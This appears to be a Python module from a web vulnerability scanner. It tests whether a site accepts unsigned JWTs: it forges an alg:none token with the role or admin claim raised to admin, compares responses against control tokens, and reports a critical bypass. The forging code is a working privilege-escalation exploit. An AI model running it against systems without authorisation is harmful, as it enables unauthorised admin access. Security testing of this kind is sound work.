import base64
import json

import requests

from . import utils



def _decode_payload(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        padded = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(padded).decode())
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return None


def _replace_token(cookie, old, new):
    return cookie.replace(old, new) if cookie else cookie


def _has_privileged_marker(response):
    if not response or response.status_code not in {200, 201}:
        return False
    content_type = response.headers.get("Content-Type", "").lower()
    if "json" not in content_type:
        return False
    body = response.text.lower()
    markers = ('"role":"admin"', '"role": "admin"', '"is_admin":true',
               '"is_admin": true', '"admin":true', '"admin": true')
    return any(marker in body for marker in markers)


def run_jwt_fuzzer(url):
    """Test an existing JWT for alg:none acceptance using three controls."""
    findings = []
    token = utils.GLOBAL_BEARER
    if not token and utils.GLOBAL_COOKIE and "eyJ" in utils.GLOBAL_COOKIE:
        for cookie in utils.GLOBAL_COOKIE.split(";"):
            if "eyJ" in cookie and "=" in cookie:
                token = cookie.split("=", 1)[1].strip()
                break

    if not token or not token.startswith("eyJ") or len(token.split(".")) != 3:
        return findings

    payload_data = _decode_payload(token)
    if not isinstance(payload_data, dict):
        return findings

    changed_claim = None
    forged_payload = dict(payload_data)
    if "role" in forged_payload:
        forged_payload["role"] = "admin"
        changed_claim = "role"
    elif "is_admin" in forged_payload:
        forged_payload["is_admin"] = True
        changed_claim = "is_admin"
    elif "admin" in forged_payload:
        forged_payload["admin"] = True
        changed_claim = "admin"
    if not changed_claim:
        return findings

    header = {"typ": "JWT", "alg": "none"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(forged_payload, separators=(",", ":")).encode()).decode().rstrip("=")
    forged_token = f"{header_b64}.{payload_b64}."
    invalid_token = "invalid.invalid.invalid"

    base_headers = {"User-Agent": "Aegis-Auto/JWT"}
    if utils.GLOBAL_COOKIE:
        base_headers["Cookie"] = utils.GLOBAL_COOKIE
    if utils.GLOBAL_BEARER:
        base_headers["Authorization"] = f"Bearer {utils.GLOBAL_BEARER}"

    forged_headers = dict(base_headers)
    forged_headers["Authorization"] = f"Bearer {forged_token}"
    if utils.GLOBAL_COOKIE:
        forged_headers["Cookie"] = _replace_token(utils.GLOBAL_COOKIE, token, forged_token)

    invalid_headers = dict(base_headers)
    invalid_headers["Authorization"] = f"Bearer {invalid_token}"
    if utils.GLOBAL_COOKIE:
        invalid_headers["Cookie"] = _replace_token(utils.GLOBAL_COOKIE, token, invalid_token)

    try:
        original = requests.get(url, headers=base_headers, timeout=5,
                                verify=False, allow_redirects=False)
        forged = requests.get(url, headers=forged_headers, timeout=5,
                              verify=False, allow_redirects=False)
        invalid = requests.get(url, headers=invalid_headers, timeout=5,
                               verify=False, allow_redirects=False)
    except requests.RequestException:
        return findings

    forged_privileged = _has_privileged_marker(forged)
    invalid_privileged = _has_privileged_marker(invalid)
    status_bypass = (forged.status_code in {200, 201}
                     and invalid.status_code in {401, 403})
    if not ((forged_privileged and not invalid_privileged) or status_bypass):
        return findings

    findings.append({
        "type": "JWT_ALG_NONE_BYPASS",
        "url": url,
        "severity": "CRITICAL",
        "confidence": "HIGH",
        "verified": True,
        "verification_method": "jwt-alg-none-controls",
        "verification_evidence": {
            "deterministic": True,
            "changed_claim": changed_claim,
            "original_status": original.status_code,
            "forged_status": forged.status_code,
            "invalid_status": invalid.status_code,
            "forged_privileged_marker": forged_privileged,
            "invalid_privileged_marker": invalid_privileged,
            "status_bypass": status_bypass,
        },
        "detail": (f"Unsigned JWT with elevated `{changed_claim}` claim received an authorization-relevant "
                   f"response while the invalid-token control did not."),
    })
    return findings
